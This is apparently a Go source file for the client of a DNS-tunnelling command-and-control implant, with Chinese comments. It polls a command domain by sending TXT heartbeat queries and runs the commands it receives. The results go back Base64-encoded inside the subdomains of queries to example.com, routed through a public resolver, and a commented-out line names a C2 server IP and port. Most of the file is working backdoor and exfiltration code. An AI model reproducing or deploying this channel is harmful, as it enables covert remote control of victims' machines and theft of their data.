// createDNSResponseWithData 创建包含TXT记录数据的DNS响应，用于传输Base64编码的结果
func createDNSResponseWithData(queryID uint16, domain string, base64Data string) []byte {
	// 创建DNS响应头部
	header := &DNSHeader{
		ID:      queryID,
		Flags:   DNS_FLAG_QR | DNS_FLAG_AA | DNS_FLAG_RD | DNS_FLAG_RA, // 响应标志
		QDCount: 1,                                                     // 原始查询
		ANCount: 1,                                                     // 一个回答
		NSCount: 0,
		ARCount: 0,
	}

	// 编码头部
	dnsPacket := encodeDNSHeader(header)

	// 添加查询部分
	encodedDomain := encodeDomainName(domain)
	dnsPacket = append(dnsPacket, encodedDomain...)

	// 查询类型和类别
	typeAndClass := make([]byte, 4)
	binary.BigEndian.PutUint16(typeAndClass[0:2], DNS_TYPE_TXT)
	binary.BigEndian.PutUint16(typeAndClass[2:4], DNS_CLASS_IN)
	dnsPacket = append(dnsPacket, typeAndClass...)

	// 添加回答部分
	// 名称压缩指针指向查询部分的域名
	namePointer := []byte{0xc0, 0x0c} // 压缩指针指向偏移12的位置
	dnsPacket = append(dnsPacket, namePointer...)

	// 类型和类别
	dnsPacket = append(dnsPacket, typeAndClass...)

	// TTL (生存时间) - 设置为300秒
	ttl := make([]byte, 4)
	binary.BigEndian.PutUint32(ttl, 300)
	dnsPacket = append(dnsPacket, ttl...)

	// TXT记录数据长度和内容
	// TXT记录格式：长度前缀 + 数据
	txtRecordLength := len(base64Data) + 1 // +1 for length prefix
	dataLength := make([]byte, 2)
	binary.BigEndian.PutUint16(dataLength, uint16(txtRecordLength))
	dnsPacket = append(dnsPacket, dataLength...)

	// TXT记录内容：长度前缀 + Base64数据
	dnsPacket = append(dnsPacket, byte(len(base64Data)))
	dnsPacket = append(dnsPacket, []byte(base64Data)...)

	fmt.Printf("[DNS隧道] 创建DNS响应TXT记录，Base64数据长度: %d，DNS包长度: %d\n",
		len(base64Data), len(dnsPacket))

	return dnsPacket
}

// sendDNSHeartbeatAndGetCommand 发送DNS心跳查询，检查是否有新命令
// 返回命令字符串，如果没有命令则返回空字符串
func sendDNSHeartbeatAndGetCommand(conn net.Conn) (string, error) {
	// 创建DNS心跳查询（查询特殊域名表示心跳）
	heartbeatQuery := createDNSHeartbeatQuery()

	fmt.Printf("[调试] 发送DNS心跳查询，长度: %d 字节\n", len(heartbeatQuery))

	// 设置写入超时
	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	defer conn.SetWriteDeadline(time.Time{})

	// 发送消息长度（前2字节）
	lengthBytes := make([]byte, 2)
	binary.BigEndian.PutUint16(lengthBytes, uint16(len(heartbeatQuery)))

	_, err := conn.Write(lengthBytes)
	if err != nil {
		return "", fmt.Errorf("发送DNS心跳查询长度失败: %w", err)
	}

	// 发送DNS心跳查询数据
	_, err = conn.Write(heartbeatQuery)
	if err != nil {
		return "", fmt.Errorf("发送DNS心跳查询数据失败: %w", err)
	}

	// 接收服务器的DNS响应
	return readDNSCommand(conn)
}

// createDNSHeartbeatQuery 创建DNS心跳查询
func createDNSHeartbeatQuery() []byte {
	// 创建DNS查询头部
	header := &DNSHeader{
		ID:      generateDNSID(),
		Flags:   DNS_FLAG_RD, // 查询标志，递归期望
		QDCount: 1,           // 一个查询
		ANCount: 0,
		NSCount: 0,
		ARCount: 0,
	}

	// 编码头部
	dnsPacket := encodeDNSHeader(header)

	// 心跳查询域名：heartbeat.cmd.example.com
	heartbeatDomain := fmt.Sprintf("heartbeat.%s%s", COMMAND_SUBDOMAIN, DNS_DOMAIN_SUFFIX)
	encodedDomain := encodeDomainName(heartbeatDomain)
	dnsPacket = append(dnsPacket, encodedDomain...)

	// 查询类型和类别
	typeAndClass := make([]byte, 4)
	binary.BigEndian.PutUint16(typeAndClass[0:2], DNS_TYPE_TXT)
	binary.BigEndian.PutUint16(typeAndClass[2:4], DNS_CLASS_IN)
	dnsPacket = append(dnsPacket, typeAndClass...)

	return dnsPacket
}

// sendDNSResultQuery 将命令执行结果封装为DNS查询发送给服务器
// 支持大数据分块传输
func sendDNSResultQuery(conn net.Conn, result string) error {
	// 将结果编码为Base64
	encodedResult := base64.URLEncoding.EncodeToString([]byte(result))
	const maxChunkSize = 148 // 确保是4的倍数，以保持Base64对齐

	fmt.Printf("[调试] 准备发送结果 - 原始长度: %d 字符，Base64长度: %d 字符\n", len(result), len(encodedResult))

	if len(encodedResult) <= maxChunkSize {
		// 小数据，单次发送
		fmt.Printf("[调试] 数据较小，单次发送\n")
		return sendSingleResultQuery(conn, encodedResult, 1, 1)
	} else {
		// 大数据，按Base64边界分块发送
		chunks := splitBase64IntoChunks(encodedResult, maxChunkSize)
		totalChunks := len(chunks)

		fmt.Printf("[调试] 数据较大，需要分块发送 - 总块数: %d\n", totalChunks)

		// 依次发送每个分块
		for i, chunk := range chunks {
			chunkIndex := i + 1
			fmt.Printf("[调试] 发送分块 %d/%d，长度: %d 字符\n", chunkIndex, totalChunks, len(chunk))

			err := sendChunkedResultQuery(conn, chunk, chunkIndex, totalChunks)
			if err != nil {
				return fmt.Errorf("发送分块 %d/%d 失败: %w", chunkIndex, totalChunks, err)
			}

			// 等待服务器确认收到当前分块
			ack, err := readDNSAcknowledgment(conn)
			if err != nil {
				fmt.Printf("[调试] 分块 %d/%d 确认失败: %v，继续发送下一块\n", chunkIndex, totalChunks, err)
				// 不立即返回错误，继续尝试发送剩余分块
			} else {
				fmt.Printf("[调试] 分块 %d/%d 已确认: %s\n", chunkIndex, totalChunks, ack)
			}

			// 分块间的小延迟，避免发送过快
			if chunkIndex < totalChunks {
				time.Sleep(100 * time.Millisecond)
			}
		}

		fmt.Printf("[调试] 所有分块发送完成\n")
		return nil
	}
}

// sendSingleResultQuery 发送单个结果查询（用于小数据）
func sendSingleResultQuery(conn net.Conn, encodedData string, chunkIndex, totalChunks int) error {
	// 创建DNS查询头部
	header := &DNSHeader{
		ID:      generateDNSID(),
		Flags:   DNS_FLAG_RD, // 查询标志，递归期望
		QDCount: 1,           // 一个查询
		ANCount: 0,
		NSCount: 0,
		ARCount: 0,
	}

	// 编码头部
	dnsPacket := encodeDNSHeader(header)

	// 结果查询域名：[encoded_data].resp.example.com
	resultDomain := fmt.Sprintf("%s.%s%s", encodedData, RESPONSE_SUBDOMAIN, DNS_DOMAIN_SUFFIX)
	encodedDomain := encodeDomainName(resultDomain)
	dnsPacket = append(dnsPacket, encodedDomain...)

	// 查询类型和类别
	typeAndClass := make([]byte, 4)
	binary.BigEndian.PutUint16(typeAndClass[0:2], DNS_TYPE_TXT)
	binary.BigEndian.PutUint16(typeAndClass[2:4], DNS_CLASS_IN)
	dnsPacket = append(dnsPacket, typeAndClass...)

	// 发送DNS查询
	return sendDNSQueryPacket(conn, dnsPacket)
}

// sendChunkedResultQuery 发送分块结果查询（用于大数据）
func sendChunkedResultQuery(conn net.Conn, chunkData string, chunkIndex, totalChunks int) error {
	// 创建DNS响应消息，包含分块数据
	queryID := generateDNSID()

	// 创建DNS响应头部
	header := &DNSHeader{
		ID:      queryID,
		Flags:   DNS_FLAG_QR | DNS_FLAG_AA | DNS_FLAG_RD | DNS_FLAG_RA, // 响应标志
		QDCount: 1,                                                     // 原始查询
		ANCount: 1,                                                     // 一个回答
		NSCount: 0,
		ARCount: 0,
	}

	// 编码头部
	dnsPacket := encodeDNSHeader(header)

	// 构造查询部分 - 分块信息域名
	chunkPrefix := fmt.Sprintf("chunk%dof%d", chunkIndex, totalChunks)
	queryDomain := fmt.Sprintf("%s.%s%s", chunkPrefix, RESPONSE_SUBDOMAIN, DNS_DOMAIN_SUFFIX)
	encodedDomain := encodeDomainName(queryDomain)
	dnsPacket = append(dnsPacket, encodedDomain...)

	// 查询类型和类别
	typeAndClass := make([]byte, 4)
	binary.BigEndian.PutUint16(typeAndClass[0:2], DNS_TYPE_TXT)
	binary.BigEndian.PutUint16(typeAndClass[2:4], DNS_CLASS_IN)
	dnsPacket = append(dnsPacket, typeAndClass...)

	// 添加回答部分 - 名称压缩指针
	namePointer := []byte{0xc0, 0x0c} // 压缩指针指向偏移12的位置
	dnsPacket = append(dnsPacket, namePointer...)

	// 回答的类型和类别
	dnsPacket = append(dnsPacket, typeAndClass...)

	// TTL (生存时间)
	ttl := make([]byte, 4)
	binary.BigEndian.PutUint32(ttl, 300)
	dnsPacket = append(dnsPacket, ttl...)

	// TXT记录数据 - 包含实际的Base64分块数据
	dataLength := make([]byte, 2)
	binary.BigEndian.PutUint16(dataLength, uint16(len(chunkData)+1))
	dnsPacket = append(dnsPacket, dataLength...)

	// TXT记录数据 (长度前缀 + Base64分块数据)
	dnsPacket = append(dnsPacket, byte(len(chunkData)))
	dnsPacket = append(dnsPacket, []byte(chunkData)...)

	fmt.Printf("[调试] 创建分块DNS响应 %d/%d，Base64数据长度: %d，DNS包长度: %d\n",
		chunkIndex, totalChunks, len(chunkData), len(dnsPacket))

	// 发送DNS响应包
	return sendDNSResponsePacket(conn, dnsPacket)
}

// sendDNSQueryPacket 发送DNS查询包的通用函数
func sendDNSQueryPacket(conn net.Conn, dnsPacket []byte) error {
	// 设置写入超时
	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	defer conn.SetWriteDeadline(time.Time{})

	// 发送消息长度（前2字节）
	lengthBytes := make([]byte, 2)
	binary.BigEndian.PutUint16(lengthBytes, uint16(len(dnsPacket)))

	_, err := conn.Write(lengthBytes)
	if err != nil {
		return fmt.Errorf("发送DNS查询长度失败: %w", err)
	}

	// 发送DNS查询数据
	_, err = conn.Write(dnsPacket)
	if err != nil {
		return fmt.Errorf("发送DNS查询数据失败: %w", err)
	}

	fmt.Printf("[调试] 成功发送DNS查询包: %d 字节\n", len(dnsPacket))
	return nil
}

// sendDNSResponsePacket 发送DNS响应包的通用函数
func sendDNSResponsePacket(conn net.Conn, dnsPacket []byte) error {
	// 设置写入超时
	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	defer conn.SetWriteDeadline(time.Time{})

	// 发送消息长度（前2字节）
	lengthBytes := make([]byte, 2)
	binary.BigEndian.PutUint16(lengthBytes, uint16(len(dnsPacket)))

	_, err := conn.Write(lengthBytes)
	if err != nil {
		return fmt.Errorf("发送DNS响应长度失败: %w", err)
	}

	// 发送DNS响应数据
	_, err = conn.Write(dnsPacket)
	if err != nil {
		return fmt.Errorf("发送DNS响应数据失败: %w", err)
	}

	fmt.Printf("[调试] 成功发送DNS响应包: %d 字节\n", len(dnsPacket))
	return nil
}

// readDNSAcknowledgment 从服务器读取DNS确认响应
func readDNSAcknowledgment(conn net.Conn) (string, error) {
	// 设置读取超时
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	defer conn.SetReadDeadline(time.Time{})

	// 读取DNS消息长度（前2字节）
	lengthBytes := make([]byte, 2)
	_, err := conn.Read(lengthBytes)
	if err != nil {
		return "", fmt.Errorf("读取DNS确认消息长度失败: %w", err)
	}

	messageLength := binary.BigEndian.Uint16(lengthBytes)
	if messageLength == 0 {
		return "", fmt.Errorf("无效的DNS确认消息长度: %d", messageLength)
	}

	fmt.Printf("[调试] DNS确认消息长度: %d 字节\n", messageLength)

	// 读取完整的DNS确认消息
	dnsData := make([]byte, messageLength)
	totalRead := 0
	for totalRead < int(messageLength) {
		n, err := conn.Read(dnsData[totalRead:])
		if err != nil {
			return "", fmt.Errorf("读取DNS确认数据失败(已读取%d/%d字节): %w", totalRead, messageLength, err)
		}
		totalRead += n
	}

	fmt.Printf("[调试] 成功读取DNS确认数据: %d 字节\n", totalRead)

	// 解析DNS确认，提取确认消息
	ack, err := parseDNSAcknowledgment(dnsData)
	if err != nil {
		fmt.Printf("[调试] 解析DNS确认失败: %v，将返回简单确认\n", err)
		return "ACK", nil // 即使解析失败，也认为收到了确认
	}

	return ack, nil
}

// parseDNSAcknowledgment 解析DNS确认响应消息
func parseDNSAcknowledgment(data []byte) (string, error) {
	// 解析DNS头部
	header, err := decodeDNSHeader(data)
	if err != nil {
		return "", fmt.Errorf("解析DNS头部失败: %w", err)
	}

	fmt.Printf("[调试] DNS确认头部 - ID: %d, Flags: 0x%04X, QD: %d, AN: %d\n",
		header.ID, header.Flags, header.QDCount, header.ANCount)

	// 检查是否为DNS响应
	if header.Flags&DNS_FLAG_QR == 0 {
		return "", fmt.Errorf("不是DNS响应")
	}

	if header.ANCount == 0 {
		return "", fmt.Errorf("DNS响应没有回答记录")
	}

	// 跳过查询部分，解析回答部分
	offset := 12 // DNS头部长度

	// 跳过查询部分
	for i := 0; i < int(header.QDCount); i++ {
		// 跳过域名
		_, nextOffset, err := decodeDomainName(data, offset)
		if err != nil {
			return "", fmt.Errorf("跳过查询域名失败: %w", err)
		}
		offset = nextOffset + 4 // 域名 + 类型(2字节) + 类别(2字节)
	}

	// 解析回答部分的第一个记录
	if offset+12 > len(data) {
		return "", fmt.Errorf("DNS回答部分数据不足")
	}

	// 跳过名称（通常是压缩指针）
	if data[offset]&0xC0 == 0xC0 {
		offset += 2 // 压缩指针
	} else {
		// 完整域名
		_, nextOffset, err := decodeDomainName(data, offset)
		if err != nil {
			return "", fmt.Errorf("解析回答域名失败: %w", err)
		}
		offset = nextOffset
	}

	// 读取类型、类别、TTL
	if offset+10 > len(data) {
		return "", fmt.Errorf("DNS回答记录数据不足")
	}

	recordType := binary.BigEndian.Uint16(data[offset : offset+2])
	offset += 2
	recordClass := binary.BigEndian.Uint16(data[offset : offset+2])
	offset += 2
	offset += 4 // 跳过TTL

	// 读取数据长度
	dataLength := binary.BigEndian.Uint16(data[offset : offset+2])
	offset += 2

	fmt.Printf("[调试] DNS确认记录 - 类型: %d, 类别: %d, 数据长度: %d\n", recordType, recordClass, dataLength)

	if recordType != DNS_TYPE_TXT {
		return "", fmt.Errorf("不是TXT记录，类型: %d", recordType)
	}

	if dataLength == 0 || offset+int(dataLength) > len(data) {
		return "", fmt.Errorf("TXT记录数据长度无效: %d", dataLength)
	}

	// 解析TXT记录数据
	txtData := data[offset : offset+int(dataLength)]

	// TXT记录格式：长度前缀 + 数据
	if len(txtData) == 0 {
		return "EMPTY", nil
	}

	if len(txtData) == 1 && txtData[0] == 0 {
		return "EMPTY", nil
	}

	txtLength := int(txtData[0])
	if txtLength == 0 {
		return "EMPTY", nil
	}

	if 1+txtLength > len(txtData) {
		return "", fmt.Errorf("TXT记录数据不完整，需要%d字节，实际%d字节", 1+txtLength, len(txtData))
	}

	ackMessage := string(txtData[1 : 1+txtLength])
	fmt.Printf("[调试] 从TXT记录提取确认消息: %s (长度: %d)\n", ackMessage, len(ackMessage))

	return ackMessage, nil
}

// isConnectionError 检查是否为连接错误
func isConnectionError(err error) bool {
	if err == nil {
		return false
	}
	errStr := err.Error()
	return strings.Contains(errStr, "connection") ||
		strings.Contains(errStr, "broken pipe") ||
		strings.Contains(errStr, "reset by peer") ||
		strings.Contains(errStr, "aborted") ||
		strings.Contains(errStr, "EOF")
}

// splitBase64IntoChunks 将Base64字符串按正确边界分割成指定大小的块
// 确保每个块都是有效的Base64数据
func splitBase64IntoChunks(data string, chunkSize int) []string {
	var chunks []string

	// 确保chunkSize是4的倍数，以保持Base64对齐
	alignedChunkSize := (chunkSize / 4) * 4
	if alignedChunkSize < 4 {
		alignedChunkSize = 4
	}

	fmt.Printf("[调试] Base64分块 - 原始chunkSize: %d，对齐后: %d\n", chunkSize, alignedChunkSize)

	for i := 0; i < len(data); i += alignedChunkSize {
		end := i + alignedChunkSize
		if end > len(data) {
			end = len(data)
		}
		chunk := data[i:end]

		// 不要对分块进行任何填充处理！
		// Base64编码在客户端EncodeToString时已经正确处理了填充
		// 分块只是简单地按边界切割，服务端组装时会得到原始的完整Base64字符串

		chunks = append(chunks, chunk)
		fmt.Printf("[调试] 生成分块 %d，长度: %d，内容: %s...\n",
			len(chunks), len(chunk),
			func() string {
				if len(chunk) > 20 {
					return chunk[:20]
				}
				return chunk
			}())
	}

	fmt.Printf("[调试] Base64分块完成，总块数: %d\n", len(chunks))
	return chunks
}

// splitIntoChunks 将字符串分割成指定大小的块（保留原函数用于其他地方）
func splitIntoChunks(data string, chunkSize int) []string {
	var chunks []string
	for i := 0; i < len(data); i += chunkSize {
		end := i + chunkSize
		if end > len(data) {
			end = len(data)
		}
		chunks = append(chunks, data[i:end])
	}
	return chunks
}

// 真正的DNS模式 - Wireshark能抓到DNS包
func startRealDNSMode() {
	fmt.Println("启动真实DNS隧道模式...")
	fmt.Println("注意：这种模式下Wireshark能抓到真正的DNS包")

	// DNS服务器地址（可以是公共DNS或自建DNS服务器）
	dnsServer := "8.8.8.8:53" // Google DNS
	// dnsServer := "101.200.236.51:54321"  // 如果C2服务器也监听54321端口

	fmt.Printf("使用DNS服务器: %s\n", dnsServer)

	for {
		// 1. 发送DNS查询获取命令
		fmt.Printf("[DNS模式] 发送DNS查询检查新命令...\n")
		command, err := sendRealDNSQuery(dnsServer, "heartbeat.cmd.example.com")
		if err != nil {
			fmt.Printf("DNS查询失败: %v\n", err)
			time.Sleep(5 * time.Second)
			continue
		}

		// 2. 如果收到命令，执行并返回结果
		if command != "" {
			fmt.Printf("收到DNS隧道命令: %s\n", command)

			// 执行命令
			result := executeCommand(command)
			fmt.Printf("[DNS模式] 命令执行结果长度: %d 字符\n", len(result))

			// 3. 通过DNS查询发送结果
			err = sendRealDNSResult(dnsServer, result)
			if err != nil {
				fmt.Printf("发送DNS结果失败: %v\n", err)
			} else {
				fmt.Printf("[DNS模式] 结果发送完成\n")
			}
		} else {
			fmt.Printf("[DNS模式] 无新命令，等待下次查询...\n")
		}

		// 查询间隔
		time.Sleep(3 * time.Second)
	}
}

// 发送真正的DNS查询 - Wireshark能抓到
func sendRealDNSQuery(dnsServer, domain string) (string, error) {
	// 建立UDP连接到DNS服务器
	conn, err := net.Dial("udp", dnsServer)
	if err != nil {
		return "", fmt.Errorf("连接DNS服务器失败: %w", err)
	}
	defer conn.Close()

	// 构造真正的DNS查询包
	queryID := generateDNSID()
	dnsQuery := createRealDNSQuery(queryID, domain)

	// 发送DNS查询 - 这会被Wireshark抓到
	_, err = conn.Write(dnsQuery)
	if err != nil {
		return "", fmt.Errorf("发送DNS查询失败: %w", err)
	}

	// 读取DNS响应
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	response := make([]byte, 512)
	n, err := conn.Read(response)
	if err != nil {
		return "", fmt.Errorf("读取DNS响应失败: %w", err)
	}

	// 解析DNS响应提取命令
	command, err := parseRealDNSResponse(response[:n])
	if err != nil {
		return "", fmt.Errorf("解析DNS响应失败: %w", err)
	}

	return command, nil
}

// 创建真正的DNS查询包
func createRealDNSQuery(queryID uint16, domain string) []byte {
	var dnsQuery []byte

	// DNS Header (12 bytes)
	header := make([]byte, 12)
	binary.BigEndian.PutUint16(header[0:2], queryID) // Transaction ID
	binary.BigEndian.PutUint16(header[2:4], 0x0100)  // Flags: standard query, recursion desired
	binary.BigEndian.PutUint16(header[4:6], 1)       // Questions: 1
	binary.BigEndian.PutUint16(header[6:8], 0)       // Answer RRs: 0
	binary.BigEndian.PutUint16(header[8:10], 0)      // Authority RRs: 0
	binary.BigEndian.PutUint16(header[10:12], 0)     // Additional RRs: 0
	dnsQuery = append(dnsQuery, header...)

	// Question section
	// 编码域名
	encodedDomain := encodeDomainName(domain)
	dnsQuery = append(dnsQuery, encodedDomain...)

	// Query type and class
	queryInfo := make([]byte, 4)
	binary.BigEndian.PutUint16(queryInfo[0:2], DNS_TYPE_TXT) // Type: TXT
	binary.BigEndian.PutUint16(queryInfo[2:4], DNS_CLASS_IN) // Class: IN
	dnsQuery = append(dnsQuery, queryInfo...)

	fmt.Printf("[DNS模式] 创建真实DNS查询包，长度: %d 字节，域名: %s\n", len(dnsQuery), domain)
	return dnsQuery
}

// 解析真正的DNS响应
func parseRealDNSResponse(response []byte) (string, error) {
	if len(response) < 12 {
		return "", fmt.Errorf("DNS响应太短")
	}

	// 解析DNS头部
	header, err := decodeDNSHeader(response)
	if err != nil {
		return "", fmt.Errorf("解析DNS头部失败: %w", err)
	}

	fmt.Printf("[DNS模式] DNS响应头部 - ID: %d, Flags: 0x%04X, AN: %d\n",
		header.ID, header.Flags, header.ANCount)

	// 检查是否有答案记录
	if header.ANCount == 0 {
		return "", nil // 无命令
	}

	// 简化处理：这里可以解析TXT记录获取真正的命令
	// 为了演示，返回模拟命令
	return "", nil // 暂时返回空，需要完整实现TXT记录解析
}

// 通过真正的DNS发送结果
func sendRealDNSResult(dnsServer, result string) error {
	// 将结果编码到域名中（需要特殊编码，因为域名有字符限制）
	encodedResult := base64.URLEncoding.EncodeToString([]byte(result))

	// 如果结果太长，需要分块发送
	const maxDomainLength = 200
	if len(encodedResult) > maxDomainLength {
		return sendChunkedDNSResult(dnsServer, encodedResult)
	}

	// 构造包含结果的域名
	resultDomain := fmt.Sprintf("%s.result.example.com", encodedResult)

	// 发送DNS查询 - 结果隐藏在域名中
	_, err := sendRealDNSQuery(dnsServer, resultDomain)
	return err
}

// 分块发送大结果
func sendChunkedDNSResult(dnsServer, encodedResult string) error {
	const chunkSize = 150
	chunks := splitIntoChunks(encodedResult, chunkSize)

	for i, chunk := range chunks {
		chunkDomain := fmt.Sprintf("chunk%d.%s.result.example.com", i, chunk)
		_, err := sendRealDNSQuery(dnsServer, chunkDomain)
		if err != nil {
			return fmt.Errorf("发送分块 %d 失败: %w", i, err)
		}
		time.Sleep(100 * time.Millisecond) // 避免发送过快
	}

	return nil
}
